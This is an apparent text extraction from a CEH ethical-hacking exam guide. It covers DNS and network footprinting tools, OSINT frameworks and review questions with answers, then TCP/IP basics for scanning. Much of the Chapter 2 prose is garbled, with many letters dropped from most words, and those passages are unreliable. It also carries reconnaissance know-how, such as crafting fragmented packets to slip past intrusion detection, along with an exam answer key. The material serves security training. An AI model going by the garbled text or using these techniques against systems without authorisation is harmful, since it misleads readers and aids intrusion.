Uix sysms bu availabl as a dowload fo Widows sysms (alog wih BIND 9),
dig is usd o s a DNS quy ad po h suls. Th basic syax fo h commad
looks lik

dig @server name type

wh server is h am o IP addss of h DNS am sv, name is h am of h
souc you’ lookig fo, ad type is h yp of cod you wa o pull.

You ca add dozs of swichs o h syax o pull mo xplici ifomaio. To s
all h swichs availabl, us h followig a h commad li:

dig -h

EXAM TIP You need to know nslookup syntax and output very well. Be sure
you know how to get into interactive mode with nslookup and how to look
or speciic inormation once there. You’ll deinitely see it on your exam.

02-ch02.indd 78 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

79

Network Footprinting
Discovig ad dfiig h wok ag ca b aoh impoa foopiig sp
o cosid. Kowig wh h ag’s IP addsss sa ad sop galy limis h im
you’ll d o spd figuig ou spcifics la—povidd, of cous, you ag op-
as i is ow IP ag. If you objciv happs o u svics i a cloud (ad s asy,
w hav aoh i chap ddicad o cloud upcomig), his may pov somwha
fusaig, bu a las you’ll kow wha you’ up agais. O of h asis ways o s
wha ag h ogaizaio ows o opas i—a las o a high lvl—is o mak us
of fly availabl gisy ifomaio.

Fo xampl, suppos you kw h IP addss of a WWW sv (asy ough o
discov, as you jus lad i h pvious scios). If you simply  ha IP addss
i www.ai., h wok ag will b show. As you ca s i Figu 2-8, -
ig h IP addss of www.mheducation.com (which is 54.164.59.97) givs us h
i wok ag. I his cas, h spos displays a ag owd ad opad
by Amazo svics, idicaig McGaw Hill is makig us of Amazo’s cloud svics.
ARIN also povids a lo of oh usful ifomaio as wll, icludig h admiisa-
iv ad chical poi of coac (POC) fo h IP ag. I his cas, as you ca s
i Figu 2-9, h coacs displayd poi us, agai, o Amazo Wb Svics (AWS)
POCs, lig us kow McGaw Hill is lyig o Amazo’s scuiy masus ad co-
ols (i pa) o poc is soucs.

Figure 2-8 Network range rom ARIN

02-ch02.indd 79 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

80

Figure 2-9 POC inormation rom ARIN

Aoh ool availabl fo wok mappig is acou (o ac hostname o Wi-
dows sysms), which is a commad-li ool ha acks a pack acoss h I ad
povids h ou pah ad asi ims. I accomplishs his by usig ICMP Echo pack-
s (UDP daagams i Liux vsios) o po ifomaio o ach “hop” (ou) fom
h souc o h dsiaio. Th TTL o ach pack icms by o af ach hop
is hi ad us, suig h spos coms back xplicily fom ha hop ad us
is am ad IP addss. Usig his, a hical hack ca build a picu of h wok.
Fo xampl, cosid a acou commad oupu fom my lapop o a suf shop dow
o h Spac Coas of Floida (ams ad IPs w chagd o poc h ioc):

C:\>tracert xxxxxx.com
Tracing route to xxxxxx.com [xxx.xxx.xxx.xxx] over a maximum of 30 hops:

1 1 ms 1 ms 1 ms 192.168.1.1
2 11 ms 13 ms 9 ms 10.194.192.1
3 9 ms 8 ms 9 ms ten2-3-orld28-ear1.noc.bhn.net [72.31.195.24]
4 9 ms 10 ms 38 ms 97.69.193.12
5 14 ms 17 ms 15 ms 97.69.194.140
6 25 ms 13 ms 14 ms ae1s0-orld71-cbr1.noc.bhn.net [72.31.194.8]
7 19 ms 21 ms 42 ms 72-31-220-0.net.bhntampa.com [72.31.220.0]
8 37 ms 23 ms 21 ms 72-31-208-1.net.bhntampa.com [72.31.208.1]
9 23 ms 22 ms 27 ms 72-31-220-11.net.bhntampa.com [72.31.220.11]

10 19 ms 19 ms 19 ms 66.192.139.41
11 20 ms 27 ms 20 ms orl1-ar3-xe-0-0-0-0.us.twtelecom.net

[66.192.243.186]
12 * * * Request timed out.
13 21 ms 27 ms 31 ms ssl7.cniweb.net [xxx.xxx.xxx.xxx]

Trace complete

02-ch02.indd 80 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

81

A viabl coucopia of ifomaio is displayd h. Noic, hough, h y i
li 12 showig imous isad of h ifomaio w’ usd o sig. This idicas,
usually, a fiwall ha dos o spod o ICMP quss—usful ifomaio i is
ow igh. Gad, i’s somims jus a ou ha dichs all ICMP quss, o v
a poply cofigud Lay 3 swich, bu i’s sill isig kowldg. To s his, a
pack capu dvic will show h packs as Typ 11, Cod 0 (TTL Expid) o as
Typ 3, Cod 13 (Admiisaivly Blockd).

NOTE Traceroute oten simply times out in modern networking because
o iltering and eorts to keep uninvited ICMP rom crossing the network
boundary.

All his ifomaio ca asily b usd o build a py comphsiv map of h
wok bw my hous ad h local suf shop dow h oad o A1A. As a ma
of fac, may ools ca sav you h im ad oubl of wiig dow ad buildig h
map youslf. Ths ools ak h ifomaio fom acou ad build imags showig
o oly h IPs ad hi layou bu also h gogaphic locaios wh you ca fid
hm. SolaWids Tacou NG (hps://www.solawids.com/wok-pfomac-
moio/us-cass/visual-acou-ool) is o such xampl. Oh acou ools
iclud Pah Aalyz Po (hps://www.pahaalyz.com/), Visual Tacou (hps://
gsui.ools/acou), Op Visual Tacou (hps://visualacou./), ad Pig-
Plo (hps://www.pigplo.com/dowload/widows). Mos of hs ools hav
ial vsios availabl fo dowload. Tak h plug ad y hm—you’ll pobably b
amazd a h locaios wh you favoi sis a acually housd!

EXAM TIP There can be signiicant dierences in traceroute rom a Windows
machine to a Linux box. Windows uses the command tracert, whereas Linux
uses traceroute. Also keep in mind that Windows is ICMP only, whereas
Linux uses UDP (and can be made to use other options). Lastly, be aware
that a route to a target today may change tomorrow. Or later today. Or in
the next ew seconds. Routes can be changed and played with by attackers
like everything else.

Other Tools
Ampig o cov vy ool v ivd aimd a foopiig is a fool’s ad;
h a bajillios of ools ou h, ad w’d v g hough hm all. Howv,
h a som mo commo opios h ad h, ad sic hos a h mo likly
os o b o you xam (ad usd i you day-o-day job), ha’s wh w should focus
ou aio. A fw oh ools woh mioig a covd h as wll.

02-ch02.indd 81 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

82

OSRFramework
If you hav’ had of OSRFamwok (hps://gihub.com/i3visio/osfamwok) y,
you pobably d o. OSRFamwok was dfid i pvious gihub documaio
as “… a op souc sach famwok i Pyho ha hlps you i h ask of us
pofilig by makig us of diff OSINT ools. Th famwok islf is dsigd
miisc o h Masploi famwok. I also has a wb-basd GUI which dos h
wok fo you if you lik o wok wihou h commad li.” I oh wods, i’s a s
of libais usd o pfom op souc illigc (OSINT) asks, hlpig you gah
mo, ad mo accua, daa usig mulipl applicaios i o asy-o-us packag.
Wha kid of daa ca you fid? Thigs lik us am, domai, pho umb, DNS
lookups, ifomaio laks sach, dp wb sach, ad much mo.

H a h applicaios culy (as of his wiig) foud i OSRFamwok:

• usufy.py This ool vifis if a us am/pofil xiss i up o 306 diff
plafoms.

• mailfy.py This ool chcks if a us am (-mail) has b gisd i up o
22 diff -mail povids.

• searchfy.py This ool looks fo pofils usig full ams ad oh ifo i sv
plafoms. ECC wods his diffly by sayig h ool quis h OSRFamwok
plafoms islf.

• domainfy.py This ool vifis h xisc of a giv domai (p h si, i
up o 1567 diff gisis).

• phonefy.py This ool chcks, oddly ough, fo h xisc of pho umbs.
I ca b usd o s if a pho umb has b likd o spam pacics.

• entify.py This ool looks fo gula xpssios.

Additional Tools
Web spiders a applicaios ha cawl hough a wbsi, poig ifomaio o wha
hy fid. Mos sach gis ly o wb spidig o povid h ifomaio hy
d o spod o wb sachs. Howv, his big us ca b mployd by a cafy
hical hack. As miod ali, usig a si such as hps://www.caf.com ca
hlp you map ou ial wb pags ad oh liks you may o oic immdialy—
ad v hos h compay dos’ aliz a sill availabl. O way wb admiisa-
os ca hlp o dfd agais sadad wb cawls is o us obos.x fils a h oo
of hi si, bu may sis mai op o spidig.

Two oh ools of o i ay discussio o social giig ad gal foopiig
a Malgo ad Social Egiig Famwok (SEF). Malgo (hps://www.malgo
.com/) is “a op souc illigc ad fosics applicaio” dsigd xplicily
o dmosa social giig (ad oh) waksss fo you viom. SEF
(hp://spl0i.og/pojcs/sf.hml) has som ga ools ha ca auoma higs such
as xacig -mail addsss ou of wbsis ad gal ppaaio fo social gi-
ig. SEF also has is io Masploi payloads fo asy phishig aacks.

02-ch02.indd 82 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

83

NOTE Even though all the methods we’ve discussed so ar are reely
available publicly and you’re not breaking any laws, I’m not encouraging
you to ootprint or gauge the security o any local business or target. As an
ethical hacker, you should get proper permission up ront, as even passively
ootprinting a business can lead to some hurt eelings and a lot o red tape.
And any misuse o potential PII (personally identiiable inormation) or other
identiying material, purposeul or not, may lead to problems or you and
your team. Again, always remain ethical in your work.

Compilig a compl lis of ifomaio-gahig opios i h foopiig sag
is aly impossibl. Th fac is, h a oppouiis vywh fo his kid of ifo-
maio gahig. Do’ fog o iclud sach gis i you ffos—you’d b su-
pisd wha you ca fid hough a sach o h compay am (o vaias hof ).
Oh compiiv illigc ools iclud Googl Als, SpyFu, ad DomaiTools.
Th lis gos o fov.

Tak som im o sach hs o you ow. Hck, yp footprinting tool io
you favoi sach gi ad chck ou wha you fid (I jus did ad go mo ha a
millio suls), o you ca pus h liss compild i Appdix A a h back of his
book. Gah som ifomaio of you ow o a ag of you choosig, ad s wha
kid of ifomaio maix you ca build, ogaizig i howv you hik maks h
mos ss o you. Rmmb, all hs oppouiis a ypically lgal (mos of h
im, ayway—v ly o a cificaio sudy book fo lgal advic), ad ayo ca
mak us of hm a ay im, fo aly ay pupos. You hav wha you d fo h
xam alady h—ow go play ad dvlop som skill ss.

Rgadlss of which mhods you choos o mploy, foopiig is pobably h
mos impoa phas of hackig you’ll d o mas. Spdig im i his sp
dasically icass h odds of succss la ad is wll woh h ffo. Jus maiai
a ogaizd appoach ad docum wha you discov. Ad do’ b afaid o go off
scip—somims followig h sps laid ou by h book is’ h bs opio. Kp
you ys, as, ad mid op. You’ll b supisd wha you ca fid ou.

Chapter Review
Foopiig is dfid as h pocss of gahig ifomaio o compu sysms ad
woks. I is h fis sp i ifomaio gahig ad povids a high-lvl blupi
of h ag sysm o wok. Foopiig follows a logical flow—ivsigaig wb
soucs ad compiiv illigc, mappig ou wok ags, miig whois ad
DNS, ad fiishig up wih social giig, -mail ackig, ad Googl hackig.

Compiiv illigc fs o h ifomaio gahd by a busiss iy abou
is compios’ cusoms, poducs, ad makig. Mos of his ifomaio is adily
availabl ad is pfcly lgal fo you o pusu ad acqui. Compiiv illigc
ools iclud Googl Als, SpyFu, ad DomaiTools.

DNS povids ampl oppouiy fo foopiig. DNS cosiss of svs
all ov h wold, wih ach sv holdig ad maagig cods fo is ow
amspac. DNS lookups gally us UDP po 53, whas zo asfs us

02-ch02.indd 83 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

84

TCP 53. Each of hs cods givs dicios o o fo a spcific yp of souc.
DNS cods a as follows:

• SRV (Service) Dfis h hosam ad po umb of svs povidig
spcific svics, such as a Dicoy Svics sv.

• SOA (Start of Authority) Idifis h pimay am sv fo h zo. Th
SOA cod coais h hosam of h sv sposibl fo all DNS cods
wihi h amspac, as wll as h basic popis of h domai.

• PTR (Pointer) Maps a IP addss o a hosam (povidig fo vs
DNS lookups).

• NS (Name Server) Dfis h am svs wihi you amspac.

• MX (Mail Exchange) Idifis h -mail svs wihi you domai.

• CNAME (Canonical Name) Povids fo domai am aliass wihi you zo.

• A (Address) Maps a IP addss o a hosam ad is usd mos of fo
DNS lookups.

DNS ifomaio fo foopiig ca also b gad hough h us of whois,
which oigially sad i Uix ad has gad ay umb of wbsis s up spcifi-
cally fo is pupos. I quis h gisis ad us ifomaio, icludig domai
owship, addsss, locaios, ad pho umbs.

Th slookup commad is pa of viually vy opaig sysm i h wold
ad povids a mas o quy DNS svs fo ifomaio. Th syax fo h ool
is as follows:

nslookup [-options] {hostname | [-server]}

Th commad ca b u as a sigl isac, povidig ifomaio basd o h
opios you choos, o you ca u i i iaciv mod, wh h commad us
as a ool, awaiig ipu fom you. Th commad ca also povid fo a zo asf,
usig ls -d.

Naiv o Uix sysms bu availabl as a dowload fo Widows sysms (alog wih
BIND 9), dig is aoh ool usd o s a DNS quy ad po h suls. Th basic
syax fo h commad is

dig @server name type

wh server is h am o IP of h DNS am sv, name is h am of h souc
you’ lookig fo, ad type is h yp of cod you wa o pull.

Dmiig h wok ag is aoh impoa foopiig ask fo h hi-
cal hack. If you simply  a IP addss i www.ai., h wok ag will
b show. Addiioally, acou (o ac hostname o Widows sysms) is a com-
mad-li ool ha acks a pack acoss h I ad povids h ou pah ad
asi ims.

02-ch02.indd 84 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

85

Do’ fog h us of h sach gi i foopiig! Googl hackig fs o
maipulaig a sach sig wih addiioal spcific opaos o sach fo vulabili-
is. Shoda is aoh sach gi of valu, displayig suls of all dvics aachd
o h I.

Social giig, -mail ackig, ad wb spidig a also foopiig ools ad
chiqus. Social giig ivolvs low- o o-ch hackig, lyig o huma i-
acio o gah ifomaio (phishig -mails, pho calls, ad so o). E-mail acks
a applicaios usd o ack daa o -mail whabous ad ails. Wb spids a usd
o cawl sis fo ifomaio bu ca b soppd by addig a obos.x fil o h oo
of h wbsi.

Questions
1. Which of h followig would b h bs choic fo foopiig sicd URLs

ad OS ifomaio fom a ag?
A. www.achiv.og
B. www.alxa.com
C. Ncaf
D. Yswa

2. Which of h followig cosiss of a publicly availabl s of daabass ha coai
domai am gisaio coac ifomaio?
A. IETF
B. IANA
C. Whois
D. OSRF

3. A SOA cod gahd fom a zo asf is show h:
@ IN SOA DNSRV1.anycomp.com. postmaster.anycomp.com. (

4 ; serial number
3600 ; refresh [1h]
600 ; retry [10m]
86400 ; expire [1d]
3600 ) ; min TTL [1h]

Wha is h am of h auhoiaiv DNS sv fo h domai, ad how of
will scoday svs chck i fo updas?
A. DNSRV1.aycomp.com, vy 3600 scods
B. DNSRV1.aycomp.com, vy 600 scods
C. DNSRV1.aycomp.com, vy 4 scods
D. posmas.aycomp.com, vy 600 scods

02-ch02.indd 85 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

86

4. A scuiy p is cofusd abou a c icid. A aack succssfully
accssd a machi i h ogaizaio ad mad off wih som ssiiv
daa. A full vulabiliy sca was u immdialy followig h hf, ad
ohig was discovd. Which of h followig bs dscibs wha may
hav happd?
A. Th aack ook advaag of a zo-day vulabiliy o h machi.
B. Th aack pfomd a full build of h machi af h was do.
C. Th aack pfomd a dial-of-svic aack.
D. Scuiy masus o h dvic w complly disabld bfo h aack bga.

5. Which foopiig ool o chiqu ca b usd o fid h ams ad addsss
of mploys o chical pois of coac?
A. whois
B. slookup
C. dig
D. acou

6. Which Googl hack would display all pags ha hav h wods SQL ad Version
i hi ils?
A. iul:SQL iul:vsio
B. alliul:SQL vsio
C. iil:SQL iul:vsio
D. alliil:SQL vsio

7. Which of h followig a passiv foopiig mhods? (Choos all ha apply.)
A. Chckig DNS plis fo wok mappig puposs
B. Collcig ifomaio hough publicly accssibl soucs
C. Pfomig a pig swp agais h wok ag
D. Siffig wok affic hough a wok ap

8. Which OSRF applicaio chcks o s if a usam has b gisd i up o
22 diff -mail povids?
A. mailfy.py
B. usufy.py
C. ify.py
D. sachfy.py

02-ch02.indd 86 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

87

9. You hav a FTP svic ad a HTTP si o a sigl sv. Which DNS
cod allows you o alias boh svics o h sam cod (IP addss)?
A. NS
B. SOA
C. CNAME
D. PTR

10. As a p s am mmb, you bgi sachig fo IP ags owd by h
ag ogaizaio ad discov hi wok ag. You also ad job posigs
ad ws aicls ad visi h ogaizaio’s wbsi. Thoughou h fis wk
of h s, you also obsv wh mploys com o ad lav wok, ad you
ummag hough h ash ousid h buildig fo usful ifomaio. Which
yp of foopiig a you accomplishig?
A. Aciv
B. Passiv
C. Rcoaissac
D. No of h abov

11. A p s is ampig o us slookup ad has h ool i iaciv mod fo
h sach. Which commad should b usd o qus h appopia cods?
A. qus yp=s
B. asf yp=s
C. loca yp=s
D. s yp=s

Answers
1. C. Ncaf is h bs choic h, as i is h oly choic allowig fo sicd

URL ad OS ifomaio foopiig.
2. C. Whois is a ga souc o scou public ifomaio gadig you ag.

Rgisaio daabass coai daa pois ha may b usful, such as domai
gisaio, pois of coacs, ad IP ags.

3. A. Th SOA cod always sas by dfiig h auhoiaiv sv—i his
cas, DNSRV1—followd by -mail coac ad a hos of oh is. Rfsh
im dfis h ival i which scoday svs will chck fo updas—i
his cas, vy 3600 scods (1 hou).

4. A. A zo-day vulabiliy is o ha scuiy psol, vdos, ad v
vulabiliy scas simply do’ kow abou y. I’s mo likly h aack
is usig a aack vco ukow o h scuiy psol ha h somhow
maagd o u off all scuiy masus wihou alig ayo.

02-ch02.indd 87 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 2

CEH Certified Ethical Hacker All-in-One Exam Guide

88

5. A. Whois povids ifomaio o h domai gisaio, icludig chical
ad busiss POCs’ addsss ad -mails.

6. D. Th Googl sach opao alliil: allows fo h combiaio of sigs i
h il. Th opao iul: looks oly i h URL of h si.

7. A, B. Passiv foopiig is all abou publicly accssibl soucs.
8. A. Th ool mailfy.py chcks if a us am (-mail) has b gisd i up o

22 diff -mail povids. Th choics usufy.py (vifis if a us am/pofil
xiss i up o 306 diff plafoms), ify.py (looks fo gula xpssios),
ad sachfy.py (looks fo pofils usig full ams ad oh ifo i sv
plafoms) a icoc.

9. C. CNAME cods povid fo domai am aliass wihi h zo.
10. B. All h mhods discussd a passiv i au, p EC-Coucil’s dfiiio.
11. D. Th syax fo h oh commads lisd is icoc.

02-ch02.indd 88 14/09/21 3:53 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CHAPTER

Scanning and Enumeration 3
In this chapter you will

• Understand EC-Council’s scanning methodology
• Describe scan types and the objectives o scanning
• Understand the use o various scanning and enumeration tools
• Describe TCP communication (three-way handshake and lag types)
• Understand basic subnetting
• Understand enumeration and enumeration techniques
• Describe vulnerability scanning concepts and actions
• Describe the steps involved in perorming enumeration

Remember before Covid-19, when we could all go out to a movie theater, eat overpriced
popcorn, and enjoy a summer blockbuster? Well, jump in the Wayback Machine with
me and Mr. Peabody, and let’s imagine this is a movie instead of a book, about a guy
beginning a career in ethical hacking. The opening credits roll, showing us that this is a
story about a young man deciding to put his hacker training to use. In the first scenes,
he’s researching vulnerabilities and keeping track of the latest news, checking on websites,
and playing with tools in his secret lab. Soon thereafter, he gets his first break and signs a
contract to penetration test a client—a client holding a secret that could change the very
fabric of modern society.

Before we’re even halfway through the buttered popcorn, the protagonist has com-
pleted some footprinting work and has tons of information on potential targets. Some
of it seems harmless enough, while some is so bizarre he’s not really sure what it even
is. He leans in, looking at the multitude of monitors all around him (while foreboding
music leads us all to the edge of our seats). The camera zooms in for a close-up, showing
his eyes widening in wonder. The crescendo of music hits as he says, “OK…so what do
I do now?”

Welcome to scanning and enumeration, where you learn what to do with all those
targets you identified in Chapter 2. You know how to footprint your client; now it’s time to
learn how to dig around in what you found for relevant, salient information. As somewhat
of an interesting side note (and a brief glimpse into the “real” world of pen testing versus
exam study), it’s important for you to consider which targets are worth scanning and which
aren’t. If you know some targets are easy, don’t risk discovery by scanning them. If you know

89

03-ch03.indd 89 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

90

an army of nerds are arrayed against you, maybe social engineering is a better option. In
any case, scanning can be viewed as a necessary evil, but it needs to be approached with
caution and respect.

When it comes to studying for your CEH exam, which is what all this is supposed to
be about, you need to stick with the flow, move through the steps as designed, and pay
attention to tools, scan types, outputs, and the like. So, after footprinting, you need to
scan for basics—the equivalent of knocking on all your neighbors’ doors to see who is
home and what they look like, or maybe checking out homes for sale to find out as much
as you can before going inside them. This ensures that when you find a machine up and
about, you’ll get to know it really well by asking some rather personal questions—but
don’t worry, systems don’t get upset. I’ll go over all you’ll need to know for the exam
regarding scanning and enumeration and show you how to play with some pretty fun
tools along the way. And the movie? Well, until someone pays me to write a script, it
probably won’t happen. If it did happen, though, undoubtedly you’d get to the end and
somebody would say, “Yeah, but the book was better.”

Fundamentals
Our first step after footprinting a target is to get started with scanning. Before we dive
into it, I think it’s important to knock out a few basics first. While in the footprinting
stage, we were gathering freely available, “10,000-foot-view” information. With scan-
ning, though, we’re talking about a much more focused effort. Footprinting may have
shown us the range of network addresses the organization uses, but now scanning is going
to tell us which of those addresses are in use and, ideally, what’s using those addresses.

In short, scanning is the process of discovering systems on the network and taking a
look at what open ports and applications may be running. With footprinting, we wanted
to know how big the network is and some general information about its makeup. In
scanning, we’ll go into the network and start touching each device to find out more
about it. But before we get to the actual scanning, though, we really need to cover some
basic TCP/IP networking knowledge.

TCP/IP Networking
We covered some networking basics in Chapter 1, but to discuss scanning intelligently,
we need to dive just a bit deeper. As you’ll recall, when a recipient system gets a frame,
it checks the physical address to see who the message is intended for. If the address is
indeed correct, the recipient opens the frame, checks to make sure the frame is valid,
and then ditches the header and trailer, passing the remainder up to the Network layer.
There, the Layer 3 address is verified in the packet header, along with a few other items,
and the header is stripped off. The remaining PDU (protocol data unit), now called a
segment, is passed to Layer 4. At the Transport layer, a whole host of important issues are
addressed—end-to-end delivery, segment order, reliability, and flow control are all Layer
4 functions—including a couple of salient issues in the discussion here: TCP flags and
port numbering.

03-ch03.indd 90 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

91

NOTE Switched networks greatly reduce the number o rames you’ll receive
that are not addressed to your system.

Connectionless Communication
When two IP-enabled hosts communicate with each other, two methods of data trans-
fer are available at the Transport layer: connectionless communication and connection-
oriented communication. Connectionless communication is fairly simple to understand:
the sender doesn’t care whether the recipient has the bandwidth (at the moment) to
accept the message, nor does the sender really seem to care whether the recipient gets the
message at all. Connectionless communication is “fire and forget.” In a much faster way
of sending datagrams, the sender can simply fire as many segments as it wants out to the
world, relying on other upper-layer protocols to handle any problems. This obviously
comes with some disadvantages as well (no error correction, retransmission, and so on).

NOTE For networking purists, TCP and UDP are not the only two Layer 4
protocols out there that use IP as a network oundation. The others are not
important to your exam, but I just thought you might want to know.

At the Transport layer, connectionless communication is accomplished with UDP.
UDP, as you can tell from the datagram structure shown in Figure 3-1, is a low-overhead,
simple, and fast transport protocol. Generally, the application protocols that use this
transport method are moving small amounts of data (sometimes just a single packet or
two) and usually are moving them inside a network structure (not across the Internet).
Examples of protocols using UDP are Trivial FTP (TFTP), DNS (for lookups), and
Dynamic Host Configuration Protocol (DHCP).

Connection-Oriented Communication
Connection-oriented communication using TCP, although it requires a lot more overhead
and is oftentimes a lot slower than connectionless communication, is a much more orderly
form of data exchange and makes a lot more sense for transporting large files or commu-
nicating across network boundaries. Senders reach out to recipients, before data is ever

Figure 3-1 Source port Destination port
UDP datagram Each header number number
structure field is 16 bits

in length
Length Checksum

Data

03-ch03.indd 91 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

92

even sent, to find out whether they’re available and whether they’d be willing to set up a
data channel. Once the data exchange begins, the two systems continue to talk with one
another, making sure flow control is accomplished, so the recipient isn’t overwhelmed and
can find a nice way to ask for retransmissions in case something gets lost along the way.
How does all this get accomplished? It’s through the use of header flags and something
known as the three-way handshake. Figure 3-2 shows the TCP segment structure.

Taking a look at Figure 3-2, you can see that six flags can be set in the TCP header.
Depending on what the segment is intended to do, some or all of these flags may be put
into use. The TCP header flags are as follows:

• SYN (Synchronize) This flag is set during initial communication establishment.
It indicates negotiation of parameters and sequence numbers.

• ACK (Acknowledgment) This flag is set as an acknowledgment to SYN flags.
This flag is set on all segments after the initial SYN flag.

• RST (Reset) This flag forces a termination of communications (in both
directions).

• FIN (Finish) This flag signifies an ordered close to communications.
• PSH (Push) This flag forces the delivery of data without concern for any

buffering. In other words, the receiving device need not wait for the buffer to
fill up before processing the data.

• URG (Urgent) When this flag is set, it indicates the data inside is being sent
out of band. Canceling a message midstream is one example.

To fully understand these flags and their usage, consider what is most often accom-
plished during a normal TCP data exchange. First, a session must be established between
the two systems. To do this, the sender forwards a segment with the SYN flag set, indi-
cating a desire to synchronize a communications session. This segment also contains a
sequence number—a pseudorandom number that helps maintain the legitimacy and
uniqueness of this session. As an aside, the generation of these numbers isn’t necessarily
all that random after all, and plenty of attack examples point that out. For study pur-
poses, though, just remember what the sequence number is and what its purpose is.

Figure 3-2 Source port Destination port
TCP segment

Sequence number
structure

Acknowledgment number

Flags
Oset Reserved URG ACK PSH Window

RST SYN FIN

Checksum

Options Padding

Data

03-ch03.indd 92 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

93

SYN
Figure 3-3

Sequence #105
The three-way
handshake

SYN/ACK
(Your) Sequence #106
(My) Sequence #223

ACK
(Your) Sequence #224
(My) Sequence #106

EXAM TIP Know the TCP lags and the three-way handshake well. You’ll be
asked questions on what lags are set at dierent points in the process, what
responses a system provides given a particular lag receipt, and what the
sequence numbers look like during a data exchange.

When the recipient gets this segment, it responds with the SYN and ACK flags set
and acknowledges the sequence number by incrementing it by one. Additionally, the
return segment contains a sequence number generated by the recipient. All this tells the
sender, “Yes, I acknowledge your request to communicate and agree to synchronize with
you. I see your sequence number and acknowledge it by incrementing it. Please use my
sequence number in further communications with me so I can keep track of what we’re
doing.” Figure 3-3 illustrates the three-way handshake.

When this segment is received by the original sender, it generates one more segment
to finish the synchronization. In this segment, the ACK flag is set, and the recipient’s
own sequence number is acknowledged. At the end of this three-way handshake, a com-
munications channel is opened, sequence numbers are established on both ends, and
data transfer can begin.

NOTE Some packet-crating tools available to you include Netscan Tools
(https://www.netscantools.com), Ostinato (https://ostinato.org), WAN Killer
(https://www.solarwinds.com), Packeth (http://packeth.sourceorge.net),
and LANorge FIRE (https://www.candelatech.com).

Knowing the TCP flags and the communications setup process, I think it’s fairly obvi-
ous how a hacker (with a tool capable of crafting segments and manipulating flags) could
manipulate, disrupt, manufacture, and even hijack communications between two sys-
tems. Want to see for yourself? Jump on the Internet and download and install Colasoft
Packet Builder (https://www.colasoft.com/download/products/download_packet_builder
.php, shown in Figure 3-4). Open it, click the Add button in the menu line, and pick a
TCP packet. You can then maneuver up and down the segment to change TCP flags and
create all sorts of mischief.

03-ch03.indd 93 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

94

Figure 3-4 Colasot Packet Builder

EXAM TIP Hey—two tips in one or you here! First, Colasot Packet Builder
has three views built in: Packet List (displays all constructed packets),
Decode Editor (allows you to edit packets), and Hex Editor (displays packet
in hex or editing). Second, know that packet builders like Colasot’s can also
be used to create ragmented packets to bypass intrusion detection systems
(and possibly irewalls) in your target network.

We’ve spent some good time discussing the flags within a segment (keep repeating
“SYN, SYN/ACK, ACK” in your head), but there are at least a couple other fields of
great importance, while we’re on the subject. The Source Port and Destination Port
fields in TCP or UDP communication define the protocols that will be used to process
the data. Better stated, they actually define a channel on which to work, and that chan-
nel has been generally agreed upon by default to support a specific protocol, but you
get the point.

Port Numbering
Why the heck do we even need port numbers in networking? Well, consider a commu-
nications process in its early stages. The recipient has verified the frame and packet that
belongs to it and knows it has a segment available for processing. But how does it know
which Application layer entity is supposed to process it? Maybe it’s an FTP datagram.

03-ch03.indd 94 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

95

Or maybe a Telnet request. Or maybe even e-mail. Without something to identify which
upper-layer protocol to hand this information to, the system sits there like a government
mid-level manager, paralyzed by indecision.

NOTE Internet Assigned Numbers Authority (IANA) maintains the Service
Name and Transport Protocol Port Number Registry, which is the oicial list
or all port number reservations.

A port number, inside the Transport layer protocol header (TCP or UDP), identifies
which upper-layer protocol should receive the information contained within. Systems
use port numbers to identify to recipients what they’re trying to accomplish—that is,
assuming the default ports are still being used for their default purposes, but we’ll get
to that later. The port numbers range from 0 to 65,535 and are split into three differ-
ent groups:

• Well-known ports 0–1023
• Registered ports 1024–49,151
• Dynamic ports 49,152–65,535

NOTE Ever wonder why port numbers go rom 0 to 65,535? I you’ve ever
taken a Cisco class and learned any binary math, the answer is rather evident:
the ield in which you’ll ind a port number is 16 bits long, and having 16 bits
gives you 65,536 dierent combinations, rom 0 all the way up to 65,535.

Of particular importance to you on the CEH exam are the well-known port numbers.
